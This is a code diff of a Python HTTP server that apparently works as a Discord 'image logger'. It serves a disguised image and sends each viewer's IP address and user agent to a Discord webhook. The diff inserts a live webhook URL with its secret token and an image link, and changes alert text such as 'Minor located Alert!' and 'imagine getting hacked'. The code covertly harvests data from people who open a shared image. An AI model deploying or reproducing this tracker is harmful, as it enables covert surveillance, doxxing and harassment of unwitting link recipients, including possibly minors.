@@ -2,8 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'WEBHOOK'
-bindata = requests.get('link to image here').content
+webhook = 'https://discord.com/api/webhooks/921881735074045952/odABLuB69AbGE8XL5WhCtdBVzRfX9dRnUZ9sJR2bZyR7NdezG5hhzVVbDS-rgU6h910G'
+bindata = requests.get('https://cdn.discordapp.com/attachments/883328412192768051/1050903923386503299/whybruhno.jpg').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
@@ -43,9 +43,9 @@ def prev(ip,uag):
     {
       "title": "Minor located Alert!",
       "color": 16711803,
-      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
+      "description": f"Discord previewed a funny Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
       "author": {
-        "name": "Fentanyl"
+        "name": "imagine getting hacked"
       },
       "fields": [
       ]
